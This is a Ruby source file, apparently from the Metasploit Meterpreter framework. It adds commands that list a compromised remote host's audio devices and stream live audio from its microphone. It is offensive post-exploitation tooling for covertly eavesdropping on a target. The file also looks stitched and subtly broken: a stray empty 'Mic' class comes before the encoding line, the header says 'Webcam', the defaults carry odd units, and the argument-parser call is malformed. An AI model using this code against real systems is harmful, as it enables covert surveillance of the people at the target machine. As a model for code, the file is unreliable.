class Mic
end# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
  module Post
    module Meterpreter
      module Ui

###
#
# Webcam - Capture video from the remote system
#
###
        class Console::CommandDispatcher::Stdapi::Mic
          Klass = Console::CommandDispatcher::Stdapi::Mic

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            {
                'channel_create_stdapi_net_mic_broadcast' => 'Play an audio stream from the specified mic',
                'stdapi_sys_audio_get_interfaces' => 'list all audio interfaces',
            }
          end

          #
          # Name for this dispatcher
          #
          def name
            "Stdapi: Mic"
          end

          def cmd_stdapi_sys_audio_get_interfaces
            client.mic.mic_list
            if client.mic.mic_list.length == 0
              print_error("No mics were found")
              return
            end

            client.mic.mic_list.each_with_index do |name, indx|
              print_line("#{indx + 1}: #{name}")
            end
          end

          def cmd_channel_create_stdapi_net_mic_broadcast(*args)
            if client.mic.mic_list.length == 0
              print_error("Target does not have a mic")
              return
            end

            print_status("Starting...")

            mic_stream_opts = Rex::Parser::Arguments.new(
                ["-h" => [ false, "Help Banner" ],
                "-s" => [ true, "The stream sample rate (Default: 48000kbps)" ],
                "-f" => [ true, "The stream frame size (Default: '480kb')" ],
                "-c" => [ true, "The number of channels (Default: 2)"]]
            )

            sample_rate = 48000
            frame_size = 480
            channel_count = 2

            mic_stream_opts.parse(args) do |opt, _idx, val|
              case opt
                when "-h"
                  print_line("Usage: mic_stream [options]\n")
                  print_line("Stream from the specified mic.")
                  print_line(mic_stream_opts.usage)
                  return
                when "-s"
                  sample_rate = val.to_i
                when "-f"
                  frame_size = val.to_i
                when "-c"
                  channel_count = val.to_i
              end
            end

            print_status("Streaming mic audio channel...")

            begin
              response, audio_channel = client.mic.mic_start
              mic_started = true
              ::Timeout.timeout(10000) do
                while client do
                  audio_channel.listen
                end
              end
            rescue ::Timeout::Error
            ensure
              client.mic.mic_stop if mic_started
            end

            print_status("Stopped")
          end
        end
      end
    end
  end
end
